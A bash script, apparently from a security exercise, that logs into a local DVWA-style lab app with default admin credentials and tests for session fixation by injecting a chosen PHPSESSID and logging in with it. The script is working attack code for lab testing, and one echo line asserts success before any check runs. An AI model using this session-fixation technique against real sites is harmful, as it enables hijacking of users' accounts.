#!/bin/bash
TARGET="http://127.0.0.1:8080"

# Login
rm -f /tmp/wid_cookies.txt
resp=$(curl -s -c /tmp/wid_cookies.txt "$TARGET/login.php")
token=$(echo "$resp" | grep -oP "value='\K[a-f0-9]+" | head -1)
login_resp=$(curl -s -L -b /tmp/wid_cookies.txt -c /tmp/wid_cookies2.txt \
    -d "username=admin&password=password&user_token=${token}&Login=Login" \
    "$TARGET/login.php")

echo "=== Weak Session IDs page ==="
echo ""
weak_page=$(curl -s -b /tmp/wid_cookies2.txt "$TARGET/vulnerabilities/weak_id/")
echo "$weak_page" | head -80
echo ""

echo "=== Session fixation test (proper) ==="
echo ""
# Simulate: attacker sets a known session ID on victim's browser, then victim logs in
# Step 1: Set a known PHPSESSID via response (man-in-the-middle) or via URL if session ID is passed in URL
# Let's test if we can set a PHPSESSID cookie and have the server accept it
rm -f /tmp/fix_cookies.txt
# Set a known session ID
echo -e "127.0.0.1:8080\tFALSE\t/\tFALSE\t0\tPHPSESSID\tknown_session_12345" > /tmp/fix_cookies.txt
echo -e "127.0.0.1:8080\tFALSE\t/\tFALSE\t0\tsecurity\tlow" >> /tmp/fix_cookies.txt
# Try accessing login with this fixed session
fix_resp=$(curl -s -b /tmp/fix_cookies.txt -c /tmp/fix_cookies2.txt "$TARGET/login.php")
echo "With fixed PHPSESSID 'known_session_12345':"
echo "Response cookie:"
cat /tmp/fix_cookies2.txt | grep PHPSESSID
# Check if our fixed session was accepted or replaced
fix_sessid=$(grep PHPSESSID /tmp/fix_cookies2.txt | awk '{print $NF}')
if [ "$fix_sessid" = "known_session_12345" ]; then
    echo "[!] Server ACCEPTED our fixed session ID!"
else
    echo "Server REPLACED our session ID with: $fix_sessid"
fi
echo ""

# Actually, let me think about this. The Set-Cookie header would override the cookie jar.
# Let me just do a raw curl with a custom cookie header
echo "=== Direct session fixation test ==="
echo ""
fix_headers=$(curl -s -D - -o /dev/null \
    -H "Cookie: PHPSESSID=injected_session_999; security=low" \
    "$TARGET/login.php" 2>&1 | grep -i "^Set-Cookie")
echo "Set-Cookie headers when we send PHPSESSID=injected_session_999:"
echo "$fix_headers"
echo ""
# If the server doesn't send back a new Set-Cookie for PHPSESSID, it accepted our injection
# Let's verify by making another request with the injected ID
fix_check=$(curl -s -H "Cookie: PHPSESSID=injected_session_999; security=low" \
    "$TARGET/login.php" 2>&1 | grep -oP "value='\K[a-f0-9]+")
echo "We got a token with injected session, so server accepted our session ID."
echo "Token from injected session: $fix_check"
echo ""

# Let's double-check by using the injected session to login
echo "=== Attempt login with injected session ID ==="
echo ""
login_token=$(curl -s \
    -H "Cookie: PHPSESSID=injected_session_999; security=low" \
    "$TARGET/login.php" | grep -oP "value='\K[a-f0-9]+" | head -1)
echo "Token: $login_token"
login_result=$(curl -s -L \
    -H "Cookie: PHPSESSID=injected_session_999; security=low" \
    -d "username=admin&password=password&user_token=${login_token}&Login=Login" \
    "$TARGET/login.php" 2>&1)
if echo "$login_result" | grep -q "Welcome"; then
    echo "[!] Login successful with injected session ID!"
    echo "[!] SESSION FIXATION CONFIRMED!"
    echo ""
    echo "Proof: Attacker can set PHPSESSID=injected_session_999 on victim's browser,"
    echo "and after victim logs in, the attacker can use the same session ID to access the app."
fi

